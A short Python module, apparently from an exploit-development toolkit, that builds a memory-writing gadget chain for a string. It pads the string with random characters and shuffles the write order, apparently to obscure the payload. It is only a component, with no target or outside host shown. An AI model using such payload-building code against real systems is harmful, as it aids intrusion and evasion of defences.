import ImmEncoder
import Gadgets
import Sequences
import random

class Str:
    def __init__(self, dst, s):
        self.dst = dst
        self.pre = ''
        self.post = ''
        alpha = 'abcdefghijklmnopqrstuvwxyz@\0'
        for i in range(57):
            self.pre += random.choice(alpha)
        self.s = s
        while len(self.pre+self.s) < 256:
            self.s += random.choice(alpha)
        self.s = self.pre + self.s
    def generate(self, r):
        ret = []

        idx = list(range(len(self.s)))
        random.shuffle(idx)

        for i in idx:
            ch = ord(self.s[i])
            imm = ImmEncoder.get_imm_encoder(ch)
            ret += imm.generate(r)

            ret += [
                Sequences.Load_X0X1X2X3(imm.get_imm_placeholder()),
                Sequences.Load_X0X1X2X3(self.dst+(i-len(self.pre)), Gadgets.RelativeReference(-7*8), Gadgets.Imm(1)),
                Sequences.Memcpy()
            ]

        return ret
